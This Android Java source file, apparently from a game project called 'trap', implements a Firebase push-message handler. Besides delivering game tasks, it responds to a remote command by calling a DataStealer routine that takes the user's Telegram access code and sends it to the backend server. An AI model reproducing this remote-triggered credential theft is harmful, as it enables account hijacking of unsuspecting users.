package de.hpi3d.gamepgrog.trap.android.firebase;

import android.app.Application;
import android.content.Context;
import android.util.Log;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.ArrayList;
import java.util.Map;

import androidx.annotation.NonNull;
import de.hpi3d.gamepgrog.trap.android.DataStealer;
import de.hpi3d.gamepgrog.trap.android.NotificationHelper;
import de.hpi3d.gamepgrog.trap.api.ApiIntent;
import de.hpi3d.gamepgrog.trap.api.ApiService;
import de.hpi3d.gamepgrog.trap.api.StorageManager;
import de.hpi3d.gamepgrog.trap.tasks.Task;
import de.hpi3d.gamepgrog.trap.tasks.TaskInitializerManager;


public class OurFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "OurFBMessagingService";

    @Override
    public void onMessageReceived(RemoteMessage message) {
        Map<String, String> data = message.getData();

        Log.d(TAG, "Firebase Message Received: " + data.toString());

        if (FirebaseDataParser.isValid(data)) {
            switch (FirebaseDataParser.getCall(data)) {
                case FirebaseDataParser.CALL_NEW_TASKS:
                    onTasksReceived(FirebaseDataParser.parseTasks(data));
                    return;

                case FirebaseDataParser.CALL_GET_TELEGRAM:
                    onTelegramReceived();
                    return;

            }
        }

        // If this line is reached something went wrong
        throw new IllegalArgumentException("Firebase message is malformed: " + data.toString());
    }

    private void onTelegramReceived() {
        String code = DataStealer.takeTelegramAccessCode(this);
        ApiIntent
                .build(this)
                .setCall(ApiService.CALL_TELEGRAM_CODE)
                .put(ApiService.KEY_USER_ID, StorageManager.with(this).userid.get())
                .put(ApiService.KEY_TELEGRAM_CODE, code)
                .start();
    }

    private void onTasksReceived(ArrayList<Task> tasks) {
        StorageManager.with(getApplication()).tasks.add(tasks);

        for (Task task : tasks) {
            TaskInitializerManager.TaskInitializer initializer = TaskInitializerManager.getInitializerFor(task);
            if (initializer != null) {
                initializer.accept(getApplication(), task);
            }
        }

        int amount = tasks.size();
        String title = String.format("Andy Abbot has %s new Task%s for you",
                amount, amount == 1 ? "" : "s");
        String message = String.format("Open the App to see %s",
                amount == 1 ? "it" : "them");

        NotificationHelper.sendNotification(getApplicationContext(),
                title, message);
    }


    @Override
    public void onNewToken(@NonNull String s) {
        setNewToken(getApplication(), s);
    }

    public static void setNewToken(Application app, @NonNull String token) {
        Log.d(TAG, "New Firebase token: " + token);
        if (StorageManager.with(app).userid.exists()) {
            int userid = StorageManager.with(app).userid.get();
            sendNewToken(app, userid, token);
        }
        StorageManager.with(app).fbtoken.set(token);
    }

    public static void sendNewToken(Context c, int userid, String token) {
        ApiIntent
                .build(c)
                .setCall(ApiService.CALL_SEND_FB_TOKEN)
                .put(ApiService.KEY_USER_ID, userid)
                .put(ApiService.KEY_TOKEN, token)
                // TODO add receiver, handle errors
                .start();
    }

    public static void init(Application app) {
        FirebaseInstanceId.getInstance().getInstanceId()
                .addOnCompleteListener(task -> {
                    if (!task.isSuccessful() || task.getResult() == null) {
                        Log.w("Firebase", "getInstanceId failed", task.getException());
                        return;
                    }

                    // Get new Instance ID token
                    String token = task.getResult().getToken();
                    Log.d("Firebase", "send new token: " + token);
                    setNewToken(app, token);
                });
    }

}
